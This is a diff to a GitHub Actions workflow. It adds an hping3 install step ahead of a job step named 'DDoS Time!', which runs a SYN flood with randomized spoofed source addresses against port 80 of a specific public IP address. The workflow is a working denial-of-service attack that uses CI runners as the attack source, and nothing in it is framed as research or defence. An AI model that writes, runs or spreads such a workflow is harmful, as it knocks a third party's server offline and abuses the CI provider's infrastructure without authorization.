@@ -4,5 +4,7 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
+      - name: Install Requirements
+        run: sudo apt install hping3
       - name: DDoS Time!
         run: sudo hping3 -S --flood --rand-source -p 80 170.155.9.185
